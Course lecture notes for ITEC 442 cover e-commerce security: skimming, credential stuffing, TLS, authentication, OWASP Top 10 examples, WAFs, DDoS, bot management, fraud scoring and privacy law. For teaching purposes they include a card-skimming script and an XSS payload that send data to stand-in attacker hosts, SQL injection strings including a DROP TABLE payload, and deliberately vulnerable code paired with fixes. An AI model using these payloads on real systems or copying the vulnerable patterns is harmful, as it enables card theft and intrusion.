---
title: "Week 10 — E-Commerce Security & Trust"
description: "E-commerce threat landscape, TLS/SSL, authentication, OWASP Top 10, WAF, DDoS protection, bot management, fraud prevention, trust signals, and privacy law compliance for ITEC 442."
---

# Week 10 — E-Commerce Security & Trust

> **Course Objectives:** CO1 (Evaluate e-commerce business models and strategies), CO9 (Analyze payment systems and financial technology for e-commerce)

---

## Learning Objectives

- [x] Identify and explain the major threats targeting e-commerce platforms
- [x] Describe how TLS/SSL protects data in transit and evaluate certificate types
- [x] Implement authentication best practices including MFA, OAuth 2.0, and secure session management
- [x] Apply the OWASP Top 10 vulnerabilities in an e-commerce context with specific examples
- [x] Evaluate Web Application Firewall (WAF) capabilities and deployment models
- [x] Explain DDoS attack types and mitigation strategies using Cloudflare and AWS Shield
- [x] Design a bot management strategy for an e-commerce site
- [x] Calculate fraud risk scores and describe automated disposition logic
- [x] Identify trust signals that measurably increase customer conversion rates
- [x] Ensure compliance with GDPR, CCPA, and COPPA for an e-commerce operation
- [x] Implement a cookie consent management platform (CMP)

---

## 1. The E-Commerce Threat Landscape

### 1.1 Why E-Commerce Is a High-Value Target

E-commerce platforms are among the most attractive targets for cybercriminals because they:
- Process and store payment card data (highly monetizable on darkweb)
- Hold personally identifiable information (PII) for millions of customers
- Maintain authentication credentials (email + password) reused across other services
- Run JavaScript from dozens of third-party vendors (attack surface for skimming)
- Operate 24/7 with high availability requirements (DDoS leverage)
- Handle inventory with real monetary value (bots and fraud)

**The cost of e-commerce cybercrime:** The FBI's IC3 reports non-delivery/non-payment fraud, credit card fraud, and identity theft collectively cost US consumers and businesses over **$10 billion** in 2022. The average cost of a data breach in retail: $3.28 million (IBM Cost of a Data Breach Report, 2023).

### 1.2 Web Skimming / Magecart Attacks

**Web skimming** (also called **formjacking** or **Magecart** after the hacking group) involves injecting malicious JavaScript into a merchant's checkout page to steal payment card data in real time as customers type.

**How a Magecart attack works:**

```
1. Attacker compromises a third-party JavaScript library used by target site
   (a tag management system, analytics vendor, chat widget, ad tracker)

2. Malicious script is injected into the third-party's CDN

3. Any site including that third-party script now runs the malicious code

4. Script listens for payment form submission events:
   document.getElementById('card-number').addEventListener('input', function(e) {
     // Silently exfiltrate card data to attacker's server
     fetch('https://attacker-cdn.com/collect', {
       method: 'POST',
       body: JSON.stringify({
         card: e.target.value,
         site: window.location.hostname,
         ts: Date.now()
       })
     });
   });

5. Card data sent to attacker-controlled server in real time
6. Cards sold on darkweb markets within hours
```

**Famous Magecart incidents:**
- **British Airways (2018):** 500,000 customers' data stolen over 2+ months via compromised JavaScript. BA fined £20 million by ICO (reduced from initial £183 million).
- **Ticketmaster (2018):** Chatbot support widget from third-party Inbenta compromised; 40,000 customer cards stolen
- **Macy's (2019):** Two JavaScript files on checkout page compromised for 8 days
- **Newegg (2018):** 15-line skimmer script embedded for 1 month

**Mitigation:**
- Use hosted payment fields (Stripe Elements, Braintree Drop-In) — card data never enters your DOM
- Implement Content Security Policy (CSP) with strict `script-src` directives
- Subresource Integrity (SRI) hashes for all third-party scripts
- Real-time JavaScript monitoring (PerimeterX Code Defender, Jscrambler)
- Regular third-party vendor security reviews

### 1.3 Credential Stuffing and Account Takeover (ATO)

**Credential stuffing** uses lists of username/password pairs from previous data breaches (billions available on darkweb) to attempt login to other sites, exploiting password reuse.

**Scale:** There are estimated 24 billion username/password pairs available on the darkweb (Digital Shadows, 2022). The average person reuses passwords across 14 accounts.

**Account takeover consequences:**
- Unauthorized purchases using stored payment methods
- Loyalty points/gift card theft (immediate monetization)
- Personal data access for further fraud
- Account used to resell products (scalping bots)

**Credential stuffing detection signals:**
```
- High login failure rate (>5% is suspicious; >20% is active attack)
- Multiple failed logins from same IP or IP range
- Successful logins from anomalous geolocations
- Logins from Tor exit nodes or known hosting/proxy IPs
- Login velocity: hundreds of attempts per minute (bot-speed)
- Login attempts using password spray patterns (one password tried across many accounts)
```

### 1.4 Fake Reviews

Fake reviews manipulate purchase decisions and violate FTC guidelines. An estimated 30–40% of online reviews are potentially fake (BrightLocal, 2023).

**Methods:**
- **Review farms:** Paid services generating fake 5-star reviews (common on Amazon)
- **Competitor attacks:** Coordinated fake negative reviews targeting competitors
- **Review gating:** Soliciting reviews only from happy customers (violates Amazon/Google TOS)
- **Incentivized reviews:** Offering discounts for reviews without disclosure (FTC violation)

**FTC enforcement:** The FTC issued its final Rule on Fake Reviews and Testimonials in August 2024, with civil penalties up to $51,744 per violation.

### 1.5 Inventory Hoarding Bots

**Inventory bots** (also called "sneaker bots" or "scalper bots") automatically purchase limited-inventory items at release time and resell them at inflated prices.

**Impact:**
- Nike SNKRS app launches: bots account for 80%+ of purchase attempts
- PS5 launch (2020): scalper bots purchased hundreds of thousands of units; resold at 2–3× MSRP
- Concert tickets (Ticketmaster): Verified Fan program attempts to distinguish humans from bots
- Losses: Legitimate customers cannot purchase; brand trust damaged

**Detection:** Inconsistent mouse movements, instant form completion, perfect timing, multiple orders from same device fingerprint.

---

## 2. TLS/SSL: Protecting Data in Transit

### 2.1 TLS Fundamentals

**TLS (Transport Layer Security)** — colloquially called SSL — is the cryptographic protocol protecting data in transit between client and server. The "S" in HTTPS stands for "Secure" and indicates TLS is in use.

**TLS Handshake (TLS 1.3, simplified):**

```
CLIENT                                    SERVER
   |                                         |
   |──── ClientHello ──────────────────────→ |
   |     (TLS version, cipher suites,        |
   |      random nonce, supported groups)    |
   |                                         |
   | ←── ServerHello ──────────────────────  |
   |     (selected cipher, random nonce,     |
   |      key_share)                         |
   |                                         |
   | ←── Certificate ──────────────────────  |
   |     (server's X.509 certificate)        |
   |                                         |
   | ←── CertificateVerify ────────────────  |
   |     (signature proving private key)     |
   |                                         |
   | ←── Finished ─────────────────────────  |
   |                                         |
   |──── Finished ──────────────────────────→|
   |                                         |
   |════ Encrypted Application Data ════════ |
   |         (HTTPS traffic)                 |
```

**TLS versions and status:**

| Version | Year | Status |
|---------|------|--------|
| SSL 2.0 | 1995 | Prohibited (CVE: DROWN, POODLE) |
| SSL 3.0 | 1996 | Prohibited (CVE: POODLE) |
| TLS 1.0 | 1999 | Deprecated (PCI DSS requires disabled since 2018) |
| TLS 1.1 | 2006 | Deprecated |
| TLS 1.2 | 2008 | Acceptable; widely used |
| TLS 1.3 | 2018 | **Preferred** — faster, stronger, fewer round trips |

### 2.2 SSL Certificate Types

| Type | Validation Level | Issuance Time | Visual Indicator | Best For |
|------|-----------------|--------------|-----------------|---------|
| **DV (Domain Validated)** | Proves domain control only | Minutes | Padlock | Blogs, info sites |
| **OV (Organization Validated)** | Proves org exists; some identity | 1–3 days | Padlock | Business sites |
| **EV (Extended Validation)** | Rigorous org identity verification | 1–2 weeks | Padlock (no green bar in modern browsers) | E-commerce, banking |
| **Wildcard** | Covers `*.domain.com` | Minutes–days | Padlock | Sites with many subdomains |
| **Multi-Domain (SAN)** | Covers multiple specific domains | Minutes–days | Padlock | Multi-brand retailers |

!!! info "EV Certificates and Conversion"
    Extended Validation certificates historically showed a green address bar and company name in browsers. Chrome and Firefox removed this visual indicator in 2019, citing no evidence it reduced phishing. EV certs remain valuable for compliance, but no longer provide a visible UX differentiation.

**Let's Encrypt** provides free DV certificates automated via the ACME protocol. It has issued over 3 billion certificates since 2015 and driven HTTPS adoption from 39% to 97%+ of web traffic.

### 2.3 HTTPS Enforcement and HSTS

**Forcing HTTPS:** Never serve e-commerce content over HTTP. Redirect all HTTP traffic to HTTPS:

```nginx
# Nginx configuration: HTTP to HTTPS redirect
server {
    listen 80;
    server_name example.com www.example.com;
    
    # Redirect all HTTP requests to HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com www.example.com;
    
    # TLS configuration
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    
    # Disable old TLS versions
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Strong cipher suites
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...;
    
    # HSTS Header (preload requires 1 year minimum)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # Other security headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
}
```

**HTTP Strict Transport Security (HSTS):** The `Strict-Transport-Security` header tells browsers to always use HTTPS for your domain, even if a user types `http://`. The `preload` directive submits your domain to browser preload lists — browsers will refuse HTTP before even connecting.

**Certificate Transparency (CT):** All publicly trusted TLS certificates must be logged in public Certificate Transparency logs (Google, DigiCert, Cloudflare operate logs). E-commerce companies should monitor CT logs for unauthorized certificates issued for their domains using tools like crt.sh, Facebook's CT monitoring, or Cloudflare's certificate transparency monitor.

---

## 3. Authentication Best Practices

### 3.1 Password Storage

**Never store plaintext passwords.** Use a modern adaptive hashing algorithm:

```python
# CORRECT: Use bcrypt, Argon2, or scrypt for password hashing
import bcrypt

def hash_password(plaintext_password: str) -> str:
    """Hash a password using bcrypt with work factor 12."""
    salt = bcrypt.gensalt(rounds=12)  # Work factor 12: ~300ms on modern hardware
    hashed = bcrypt.hashpw(plaintext_password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(plaintext_password: str, stored_hash: str) -> bool:
    """Verify a password against its stored hash."""
    return bcrypt.checkpw(
        plaintext_password.encode('utf-8'),
        stored_hash.encode('utf-8')
    )

# WRONG: Never do this
import hashlib
bad_hash = hashlib.md5(password.encode()).hexdigest()  # NEVER: MD5 is broken
bad_hash2 = hashlib.sha256(password.encode()).hexdigest()  # NEVER: Unsalted SHA is fast = crackable
```

**Password hashing algorithm comparison:**

| Algorithm | Recommended | Configurable Work Factor | GPU Attack Resistance |
|-----------|------------|--------------------------|----------------------|
| MD5 | ❌ Never | No | Very poor |
| SHA-256 (unsalted) | ❌ Never | No | Poor |
| bcrypt | ✅ Yes | Yes (rounds) | Good |
| scrypt | ✅ Yes | Yes (N, r, p) | Very good |
| **Argon2id** | ✅ Best | Yes (time, memory, parallelism) | Excellent |

**NIST SP 800-63B** password guidelines (2017):
- Minimum 8 characters; allow up to 64 characters
- Allow all printable ASCII and Unicode
- Check against breach databases (HaveIBeenPwned API) at registration
- Do NOT enforce periodic password expiration (causes weaker passwords)
- Do NOT require complexity rules (uppercase + number + symbol) — length is more secure

### 3.2 Multi-Factor Authentication (MFA)

MFA requires two or more verification factors:
- **Something you know:** Password, PIN, security questions
- **Something you have:** TOTP authenticator app, SMS code, hardware security key
- **Something you are:** Fingerprint, Face ID, iris scan

**MFA methods for e-commerce (ranked by security):**

| Method | Security | Phishing Resistant | UX Friction | Notes |
|--------|----------|--------------------|-------------|-------|
| FIDO2/WebAuthn (hardware key) | ★★★★★ | Yes | Low | Yubikey, passkeys |
| Passkeys (FIDO2 biometric) | ★★★★★ | Yes | Very Low | Apple/Google passkey sync |
| TOTP (Authenticator app) | ★★★★ | No | Medium | Google Authenticator, Authy |
| SMS OTP | ★★★ | No | Medium | Vulnerable to SIM swap |
| Email OTP | ★★★ | No | Medium | Depends on email account security |
| Security questions | ★ | No | Low | Answers often guessable/public |

!!! warning "SIM Swap Fraud"
    SMS-based 2FA is vulnerable to **SIM swap attacks** — criminals bribe or socially engineer mobile carrier representatives to transfer a victim's phone number to a SIM card they control. High-profile victims include Jack Dorsey (Twitter CEO, 2019) and numerous cryptocurrency holders. For high-value accounts, recommend TOTP or passkeys over SMS.

### 3.3 OAuth 2.0 and OpenID Connect

**OAuth 2.0** is an authorization framework allowing third-party applications to access user resources without exposing passwords. **OpenID Connect (OIDC)** is an identity layer on top of OAuth 2.0, adding authentication.

**"Sign in with Google" flow (Authorization Code + PKCE):**

```
1. User clicks "Sign in with Google" on merchant site

2. Browser redirects to Google Authorization Server:
   https://accounts.google.com/o/oauth2/auth?
     client_id=MERCHANT_CLIENT_ID
     &redirect_uri=https://store.com/auth/callback
     &response_type=code
     &scope=openid email profile
     &state=CSRF_TOKEN
     &code_challenge=PKCE_CHALLENGE
     &code_challenge_method=S256

3. User authenticates with Google (and grants consent)

4. Google redirects back to store:
   https://store.com/auth/callback?
     code=AUTHORIZATION_CODE
     &state=CSRF_TOKEN

5. Backend exchanges code for tokens:
   POST https://oauth2.googleapis.com/token
   Body: code, client_id, client_secret, redirect_uri, 
         code_verifier, grant_type=authorization_code
   
   Response: {
     "access_token": "ya29.XXXX",
     "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",  // JWT
     "expires_in": 3599,
     "refresh_token": "1//XXXX"
   }

6. Decode id_token (JWT) to get user identity:
   {
     "sub": "110169484474386276334",  // Unique Google user ID
     "email": "customer@gmail.com",
     "email_verified": true,
     "name": "Jane Customer",
     "picture": "https://lh3.googleusercontent.com/..."
   }

7. Find or create account in merchant database using sub (stable ID)
8. Issue session cookie or JWT to customer
```

### 3.4 Session Management

```python
# Secure session cookie configuration (Flask example)
from flask import Flask
import secrets

app = Flask(__name__)

app.config.update(
    SECRET_KEY=secrets.token_hex(32),  # Cryptographically random
    SESSION_COOKIE_SECURE=True,        # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,      # No JavaScript access (XSS protection)
    SESSION_COOKIE_SAMESITE='Lax',    # CSRF protection
    SESSION_COOKIE_NAME='__Secure-session',  # __Secure- prefix enforces HTTPS
    PERMANENT_SESSION_LIFETIME=1800,   # 30 minutes inactivity timeout
)

# Session rotation after privilege change (login, checkout)
def rotate_session():
    """Regenerate session ID to prevent session fixation."""
    old_data = dict(session)
    session.clear()
    session.update(old_data)
    session.modified = True
```

---

## 4. OWASP Top 10 in E-Commerce Context

The **OWASP Top 10** (2021) identifies the most critical web application security risks. Each has specific manifestations in e-commerce.

### 4.1 A03: Injection — SQL Injection in Product Search

**Scenario:** A vulnerable product search endpoint builds SQL from user input:

```python
# VULNERABLE: String concatenation builds SQL query
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # NEVER do this — SQL injection vulnerability
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    results = db.execute(sql)
    return jsonify(results)

# Attack: User submits q=' OR '1'='1
# Resulting SQL: SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'
# Returns ALL products — including unlisted/internal items

# Worse attack: q='; DROP TABLE orders; --
# Resulting SQL: ...LIKE '%'; DROP TABLE orders; --%'
# (Destroys orders table if DB user has DROP privilege)
```

```python
# SECURE: Parameterized queries with bound parameters
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Safe: query is a parameter, never interpreted as SQL
    sql = "SELECT * FROM products WHERE name LIKE ? AND active = 1"
    results = db.execute(sql, (f'%{query}%',))
    return jsonify(results)
```

### 4.2 A03: Injection — XSS in Product Reviews

**Scenario:** A product review section stores and renders user content without sanitization:

```html
<!-- VULNERABLE: Renders raw HTML from database into page -->
<div class="review-text">
  {{ review.content | safe }}
</div>

<!-- Attacker submits review containing: -->
<script>
  // Steal session cookie and send to attacker
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  
  // Or redirect to phishing page
  window.location = 'https://phishing-checkout.com/pay';
</script>
```

```python
# SECURE: Sanitize HTML server-side before storage
import bleach

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'p', 'br']
ALLOWED_ATTRS = {}

def sanitize_review(content: str) -> str:
    """Strip all HTML tags except a safe whitelist."""
    return bleach.clean(content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)

# Also set Content-Security-Policy header to prevent inline script execution:
# Content-Security-Policy: default-src 'self'; script-src 'self' https://js.stripe.com;
```

### 4.3 A01: Broken Access Control — IDOR in Order IDs

**Insecure Direct Object Reference (IDOR):** A customer accesses another customer's order by guessing the order ID.

```python
# VULNERABLE: Sequential integer order IDs expose all orders
@app.route('/orders/<int:order_id>')
def get_order(order_id):
    order = db.query("SELECT * FROM orders WHERE id = ?", (order_id,))
    return jsonify(order)  # Any user can see any order by incrementing ID

# Attacker: GET /orders/10001, /orders/10002, /orders/10003... 
# Exposes ALL customer orders, addresses, payment last-4, etc.
```

```python
# SECURE: Always verify ownership before returning data
from flask_login import login_required, current_user

@app.route('/orders/<int:order_id>')
@login_required  # Must be authenticated
def get_order(order_id):
    # Fetch AND verify ownership in same query
    order = db.query(
        "SELECT * FROM orders WHERE id = ? AND customer_id = ?",
        (order_id, current_user.id)
    )
    
    if not order:
        # Don't reveal whether order exists — return 404 for both "not found" and "unauthorized"
        abort(404)
    
    return jsonify(order)

# Additional: Use UUIDs instead of sequential integers for order IDs
# Even if exposed, UUIDs are not guessable
# import uuid; order_id = str(uuid.uuid4())
```

### 4.4 Additional OWASP Top 10 in E-Commerce

| Vulnerability | E-Commerce Example | Mitigation |
|--------------|-------------------|-----------|
| **A02: Cryptographic Failures** | Storing card data in plaintext; HTTP on checkout | Tokenize payment data; enforce HTTPS; encrypt PII at rest |
| **A04: Insecure Design** | No rate limiting on login endpoint | Design threat models; add rate limiting from the start |
| **A05: Security Misconfiguration** | Debug mode enabled in production; default admin credentials | Environment-specific configs; security hardening checklists |
| **A07: Auth Failures** | Session token in URL; no session expiry | Cookies only; rotate sessions; expire after inactivity |
| **A08: Software/Data Integrity Failures** | Skimmer via compromised CDN (Magecart) | CSP; Subresource Integrity hashes |
| **A09: Logging/Monitoring Failures** | No alerting on mass login failures | SIEM; anomaly detection; 24/7 alerting |
| **A10: SSRF** | Product image URL parameter fetches internal services | Allowlist for URL fetching; block internal IP ranges |

---

## 5. Web Application Firewalls

### 5.1 WAF Architecture and Function

A **Web Application Firewall (WAF)** inspects HTTP/HTTPS traffic between the internet and the web application, blocking malicious requests based on signatures, rules, and behavioral analysis.

**WAF deployment models:**

=== "Cloud/CDN WAF (Recommended for Most E-Commerce)"
    Positioned at the edge, before traffic reaches origin servers.
    
    - **Cloudflare WAF:** Integrated with Cloudflare's CDN; rules managed in dashboard; 165 Tbps global network capacity
    - **AWS WAF:** Integrates with CloudFront, Application Load Balancer, API Gateway
    - **Fastly Next-Gen WAF (formerly Signal Sciences):** Strong for API protection and low false positives
    - **Imperva Cloud WAF:** Strong bot management + WAF bundle
    
    **Advantages:** 
    - No latency added at origin
    - Absorbs DDoS at edge before reaching servers
    - Automatic rule updates from threat intelligence
    - Easy to provision (DNS change)

=== "On-Premises / Host-Based WAF"
    Installed at origin — either as a reverse proxy (ModSecurity + Nginx) or inline appliance.
    
    - **ModSecurity (open source):** Most widely deployed WAF; uses OWASP Core Rule Set (CRS)
    - **F5 BIG-IP ASM:** Enterprise appliance; deep protocol inspection
    
    **Advantages:**
    - Full control over rules and data
    - No reliance on third-party
    
    **Disadvantages:**
    - Traffic reaches origin before inspection
    - Higher operational burden

### 5.2 WAF Rule Categories

| Rule Category | What It Blocks | Example Pattern |
|--------------|----------------|-----------------|
| **OWASP CRS** | SQLi, XSS, RFI, Path Traversal | `UNION SELECT`, `<script>`, `../../../etc/passwd` |
| **IP Reputation** | Known malicious IPs, Tor exit nodes, hosting ranges | Threat intelligence feeds |
| **Rate Limiting** | Brute force, DDoS, scraping | >10 login attempts/minute from one IP |
| **Bot Signatures** | Known malicious user agents, headless browsers | `HeadlessChrome`, `python-requests` patterns |
| **Custom Rules** | Business-specific protections | Block non-US traffic during targeted attack |
| **Geo-blocking** | Block countries with no business need | Block all traffic except US/CA/UK/AU |

---

## 6. DDoS Protection

### 6.1 DDoS Attack Types

A **Distributed Denial of Service (DDoS)** attack floods a target with traffic to exhaust resources and deny service to legitimate users. E-commerce DDoS typically occurs during peak events (Black Friday, product launches) by competitors or extortionists.

| Attack Layer | Type | Description | Example |
|-------------|------|-------------|---------|
| **Layer 3/4 (Network/Transport)** | Volumetric | Overwhelm bandwidth with raw traffic | UDP flood, ICMP flood |
| **Layer 3/4** | Protocol | Exploit protocol weaknesses | SYN flood, Ping of Death |
| **Layer 7 (Application)** | HTTP Flood | Simulate legitimate requests | GET/POST flood on search/checkout |
| **Layer 7** | Slowloris | Hold connections open with slow requests | Exhausts connection limits |
| **Layer 7** | HTTPS Flood | TLS handshake exhaustion (expensive to process) | SSL renegotiation attack |

### 6.2 Cloudflare DDoS Protection

**Cloudflare** operates a 165+ Tbps global anycast network. DDoS mitigation is automatic and always-on:

- **Anycast routing:** DDoS traffic is absorbed across Cloudflare's 330+ global PoPs before reaching origin
- **Magic Transit:** BGP-advertised DDoS protection for IP prefixes (ISP and network-level)
- **HTTP DDoS Attack Protection:** Machine-learning based detection; automatically creates adaptive rules
- **Rate Limiting:** Configurable rules based on IP, path, and header patterns
- **Under Attack Mode:** CAPTCHA challenge for all visitors during active attacks

**Largest DDoS Cloudflare has mitigated:** 71 million requests/second HTTP DDoS (February 2023) — largest ever recorded.

### 6.3 AWS Shield

**AWS Shield** provides two tiers of DDoS protection for AWS-hosted applications:

| Tier | Cost | Coverage | SLA |
|------|------|---------|-----|
| **Shield Standard** | Free (included) | Automatic L3/L4 protection for all AWS resources | Best effort |
| **Shield Advanced** | $3,000/month + data transfer | L3/L4/L7 protection; WAF included; 24/7 DRT support | Cost protection for scaling |

**Shield Advanced cost protection:** If a DDoS attack causes AWS bill to spike, Shield Advanced customers can request credit — protecting against the financial impact of scaling under attack.

---

## 7. Bot Management

### 7.1 Bot Classification

Not all bots are malicious. A bot management strategy must distinguish:

| Bot Type | Example | Impact | Action |
|----------|---------|--------|--------|
| **Good bots** | Googlebot, Bingbot, Uptime monitors | Positive | Allow |
| **Gray bots** | SEO scrapers, price comparison | Neutral–negative | Rate limit |
| **Bad bots** | Credential stuffing, scalper bots, scrapers | Negative | Block |
| **Internal bots** | Synthetic monitoring, CI/CD health checks | Positive | Allow (IP allowlist) |

**Bot traffic statistics:** Imperva's 2023 Bad Bot Report found **49.6% of all internet traffic is bots** — 30.2% bad bots, 17.3% good bots.

### 7.2 Bot Detection Techniques

=== "Passive Signals (No User Interaction)"
    - **User Agent string:** Bots often use obvious UA strings (`python-requests`, `curl`, `Scrapy`)
    - **IP reputation:** Known bot hosting providers (AWS, GCP, Hetzner), Tor exit nodes
    - **Request rate:** 1,000 requests/minute from one IP is not human
    - **TLS fingerprint (JA3):** Browser TLS handshake patterns differ from scripted tools
    - **HTTP/2 header ordering:** Browsers send headers in specific consistent order
    - **Canvas/WebGL fingerprint:** Rendered differently by real browsers vs. headless Chrome

=== "Active Challenges (User Interaction Required)"
    - **CAPTCHA (Google reCAPTCHA v2):** "I'm not a robot" checkbox; image selection
    - **Invisible CAPTCHA (reCAPTCHA v3):** Scores 0.0–1.0 based on behavior; no user interaction
    - **Proof of Work:** Require browser to solve a computational puzzle (Cloudflare Turnstile)
    - **JavaScript Challenge:** Execute JavaScript to prove browser capabilities

=== "Behavioral Biometrics"
    - **Mouse movement patterns:** Human movement is curved and variable; bots move in straight lines or teleport
    - **Keystroke dynamics:** Typing rhythm (time between keys) is unique per person
    - **Scroll behavior:** Humans scroll irregularly; bots often don't scroll at all
    - **Touch pressure and angle (mobile):** Unique biometric signals from touchscreen interactions

**Commercial bot management platforms:**
- **Cloudflare Bot Management:** Integrated with CDN; ML-based scoring
- **DataDome:** Real-time bot detection API; low latency (<2ms)
- **PerimeterX (HUMAN Security):** Strong in retail; acquired by HUMAN Security 2022
- **Radware Bot Manager:** Behavioral analysis + challenge-response

---

## 8. Fraud Signals and Risk Scoring

### 8.1 Fraud Risk Score Components

A fraud risk score aggregates many signals into a single number (typically 0–100 or 0–1000) used for automated disposition.

```python
class FraudRiskScorer:
    """Aggregate multiple fraud signals into a composite risk score."""
    
    def calculate_score(self, order: dict, session: dict) -> dict:
        score = 0
        signals = []
        
        # === DEVICE SIGNALS ===
        if session.get('is_headless_browser'):
            score += 30
            signals.append({'signal': 'HEADLESS_BROWSER', 'weight': 30})
        
        if session.get('bot_score', 0) > 0.7:
            score += 25
            signals.append({'signal': 'HIGH_BOT_PROBABILITY', 'weight': 25})
        
        # === VELOCITY SIGNALS ===
        failed_logins = self.get_failed_logins_24h(session['ip'])
        if failed_logins > 10:
            score += min(failed_logins * 2, 40)  # Cap at 40
            signals.append({'signal': 'HIGH_LOGIN_VELOCITY', 'weight': min(failed_logins * 2, 40)})
        
        orders_same_device = self.get_orders_same_device_24h(session['device_fingerprint'])
        if orders_same_device > 3:
            score += 20
            signals.append({'signal': 'MULTIPLE_ORDERS_SAME_DEVICE', 'weight': 20})
        
        # === IDENTITY SIGNALS ===
        if not self.email_domain_exists(order['email']):
            score += 35
            signals.append({'signal': 'INVALID_EMAIL_DOMAIN', 'weight': 35})
        
        if self.is_email_in_breach_list(order['email']):
            score += 15
            signals.append({'signal': 'BREACHED_EMAIL', 'weight': 15})
        
        # === GEO SIGNALS ===
        billing_country = self.get_country_from_address(order['billing'])
        ip_country = self.get_country_from_ip(session['ip'])
        if billing_country != ip_country and ip_country not in ['US', 'CA']:
            score += 20
            signals.append({'signal': 'GEO_MISMATCH', 'weight': 20})
        
        if self.is_tor_or_vpn(session['ip']):
            score += 15
            signals.append({'signal': 'TOR_OR_VPN', 'weight': 15})
        
        # === ORDER SIGNALS ===
        if (order['amount'] > 500 and 
            self.is_first_order(order['email']) and
            order['shipping_method'] == 'overnight'):
            score += 25
            signals.append({'signal': 'HIGH_VALUE_FIRST_ORDER_RUSH', 'weight': 25})
        
        # === DISPOSITION ===
        if score >= 75:
            disposition = 'DECLINE'
        elif score >= 45:
            disposition = 'REVIEW'
        else:
            disposition = 'APPROVE'
        
        return {
            'score': min(score, 100),
            'disposition': disposition,
            'signals': signals
        }
```

### 8.2 Risk Score Thresholds

| Score Range | Disposition | Action |
|-------------|------------|--------|
| 0–44 | **Approve** | Process normally |
| 45–74 | **Review** | Queue for manual analyst review; hold fulfillment |
| 75–100 | **Decline** | Refuse order; log for pattern analysis |

---

## 9. Trust Signals That Increase Conversion

### 9.1 Why Trust Matters

The Baymard Institute (2023) found that **17% of cart abandonments** are due to "I didn't trust the site with my credit card information." Building perceived trust is directly convertible to revenue.

### 9.2 Trust Signal Taxonomy

=== "Security Trust Signals"
    | Signal | Placement | CVR Impact |
    |--------|-----------|-----------|
    | SSL padlock in browser bar | Always present when HTTPS | Baseline expectation |
    | Trust badge (McAfee SECURE, Norton Secured) | Checkout page, footer | +5–10% in studies |
    | PCI compliance badge | Checkout page | +3–7% |
    | "Secure Checkout" messaging near payment form | Payment step | +4–8% |
    | Card brand logos (Visa, MC, Amex, Discover, PayPal) | Cart, checkout | +3–5% |

=== "Social Proof Signals"
    | Signal | Placement | CVR Impact |
    |--------|-----------|-----------|
    | Aggregate star rating (4.5 ★ of 2,000+ reviews) | Homepage, product page | +15–25% |
    | Number of customers served | Homepage ("500,000+ happy customers") | +8% |
    | Real-time activity ("12 people viewing this") | Product page | +8–12% |
    | Press mentions ("As featured in...") | Homepage, about page | +5–10% |
    | User-generated photo reviews | Product page | +25% |

=== "Policy Trust Signals"
    | Signal | Placement | CVR Impact |
    |--------|-----------|-----------|
    | Free returns / easy return policy | Product page, cart, footer | +15–20% |
    | Money-back guarantee | Checkout, product page | +10–15% |
    | Privacy policy (GDPR compliant) | Footer, checkout | Compliance + trust |
    | Contact information (phone, email, chat) | Header, footer, checkout | +5–10% |
    | Physical address | Footer, about page | Trust signal for legitimacy |

!!! success "Trust Badge ROI Study"
    A/B test by VWO (2020): Adding a "Norton Secured" trust seal to the checkout page of a consumer electronics site increased conversions by 7.6%, representing $87,000 in additional monthly revenue on $1.15M baseline.

---

## 10. Privacy Law Compliance

### 10.1 GDPR (EU General Data Protection Regulation)

**GDPR** (effective May 2018) applies to any organization processing personal data of EU residents, regardless of where the organization is located.

**Key GDPR principles for e-commerce:**

| Principle | E-Commerce Application |
|-----------|----------------------|
| **Lawful basis for processing** | Consent, contract, legitimate interest — document each |
| **Data minimization** | Collect only what is necessary (don't collect birthdate if you don't need it) |
| **Purpose limitation** | Don't use checkout email for unrelated marketing without consent |
| **Right to access** | Provide data export within 30 days of request |
| **Right to erasure ("right to be forgotten")** | Delete account and associated data on request |
| **Right to portability** | Export personal data in machine-readable format (JSON/CSV) |
| **Privacy by design** | Build privacy controls into systems, not as afterthought |
| **Data breach notification** | Notify supervisory authority within 72 hours; affected individuals without undue delay |

**GDPR fines:** Up to €20 million or 4% of global annual revenue (whichever is higher).

Notable e-commerce GDPR fines:
- **Amazon (2021):** €746 million by Luxembourg for advertising targeting without consent
- **H&M (2020):** €35.3 million for unlawful employee monitoring
- **Google (2019):** €50 million by France for lack of transparent consent for personalization

### 10.2 CCPA (California Consumer Privacy Act)

**CCPA** (effective January 2020, amended by CPRA 2023) applies to businesses that:
- Have annual gross revenues > $25 million, OR
- Buy, sell, or share personal information of 100,000+ consumers/households/devices annually, OR
- Derive 50%+ of revenues from selling personal information

**CCPA rights for California residents:**

| Right | Description | E-Commerce Implementation |
|-------|-------------|--------------------------|
| Right to know | What personal data is collected and how it's used | Privacy policy; "Data categories collected" disclosure |
| Right to delete | Request deletion of personal data | Delete account functionality within 45 days |
| Right to opt-out | Opt out of sale/sharing of personal data | "Do Not Sell or Share My Personal Information" link (required) |
| Right to correct | Request correction of inaccurate data | Account settings → edit profile |
| Right to limit | Limit use of sensitive personal information | Sensitive data category disclosures |
| Right to non-discrimination | Cannot be penalized for exercising rights | Cannot deny service or charge more |

**CCPA fines:** $2,500 per unintentional violation, $7,500 per intentional violation.

### 10.3 COPPA (Children's Online Privacy Protection Act)

**COPPA** (US federal law) prohibits collecting personal information from children under 13 without verifiable parental consent.

**E-commerce implications:**
- Do not knowingly allow users under 13 to create accounts
- Age gate or neutral age screening on registration ("What is your birth date?")
- Do not target advertising to children or collect behavioral data from under-13 users
- Notify and obtain parental consent before collecting, using, or disclosing children's data
- Provide parents with ability to review and delete their child's information

